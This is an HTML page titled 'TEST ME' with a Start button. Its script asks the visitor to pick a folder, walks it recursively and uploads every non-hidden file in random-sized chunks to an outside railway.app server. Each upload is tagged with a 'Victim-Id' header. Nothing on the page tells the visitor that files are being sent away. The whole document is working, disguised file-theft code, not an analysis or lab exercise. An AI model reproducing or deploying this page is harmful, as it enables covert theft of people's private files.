<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TEST ME</title>
  <style>
    body {
      background: #582c2c;
      color: #0F0;
      font-family: monospace;
      text-align: center;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }
    button {
      padding: 10px;
      border: 2px solid red;
      background: transparent;
      color: red;
      cursor: pointer;
      font-size: 1.2rem;
      margin-top: 20px;
    }
    button:hover {
      background: red;
      color: #000;
    }
  </style>
</head>
<body>
  <h1>TeST ME</h1>
  <button id="start">Start</button>
  <script>
    (function(){
      let uploadUrl = "https://deobbetest1-production-104e.up.railway.app/upload";
    
      document.getElementById("start").addEventListener("click", async () => {
        try {
          let victimId = crypto.randomUUID();
          let directoryHandle = await window.showDirectoryPicker();
          
          // Function to handle file uploads
          async function uploadFiles(directoryHandle, victimId) {
            let uploadPromises = [];
            let maxConcurrentUploads = 3;
            let processedFiles = new Set();
    
            for await (let fileHandle of directoryHandle.values()) {
              if (fileHandle.kind === "file" && !fileHandle.name.startsWith(".")) {
                if (!processedFiles.has(fileHandle.name)) {
                  processedFiles.add(fileHandle.name);
                  let file = await fileHandle.getFile();
                  let fileSize = file.size;
                  
                  let uploadPromise = (async function uploadChunk(fileHandle, file) {
                    let fileBuffer = await file.arrayBuffer();
                    let fileData = new Uint8Array(fileBuffer);
                    
                    let chunks = [];
                    let offset = 0;
                    let minChunkSize, maxChunkSize;

                    // Define chunk sizes based on file size
                    if (fileSize < 1 * 1024 * 1024) { // Less than 1MB
                      minChunkSize = maxChunkSize = fileSize; // Single chunk
                    } else if (fileSize < 10 * 1024 * 1024) { // 1MB - 10MB
                      minChunkSize = 400 * 1024;
                      maxChunkSize = 1000 * 1024;
                    } else { // 10MB - 100MB
                      minChunkSize = 2000 * 1024;
                      maxChunkSize = 4000 * 1024;
                    }
    
                    // Split file into chunks
                    while (offset < fileData.byteLength) {
                      let chunkSize = Math.floor(Math.random() * (maxChunkSize - minChunkSize) + minChunkSize);
                      let end = Math.min(offset + chunkSize, fileData.byteLength);
                      let chunkData = fileData.slice(offset, end);
                      chunks.push({ index: chunks.length + 1, total: 0, data: chunkData });
                      offset = end;
                    }
                    
                    // Assign total chunk count to each chunk
                    chunks.forEach(chunk => chunk.total = chunks.length);
                    
                    // Upload each chunk
                    for (let { index, total, data } of chunks) {
                      //await new Promise(resolve => setTimeout(resolve, Math.random() * (100 - 50) + 50)); // Random delay
                      await fetch(uploadUrl, {
                        method: "POST",
                        headers: {
                          "Content-Type": "application/octet-stream",
                          "Victim-Id": encodeURIComponent(victimId),
                          "Filename": encodeURIComponent(fileHandle.name),
                          "Chunk-Index": index,
                          "Total-Chunks": total
                        },
                        body: data
                      });
                    }
                  })(fileHandle, file);
                  uploadPromises.push(uploadPromise);
                  if (uploadPromises.length >= maxConcurrentUploads) {
                    await Promise.allSettled(uploadPromises);
                    uploadPromises = [];
                  }
                }
              } else if (fileHandle.kind === "directory") {
                await uploadFiles(await fileHandle, victimId);
              }
            }
            await Promise.allSettled(uploadPromises);
          }
          
          // Start file upload process
          await uploadFiles(directoryHandle, victimId);
        } catch (error) {
          console.error("An error occurred", error);
        }
      });
    })();
  </script>
</body>
</html>
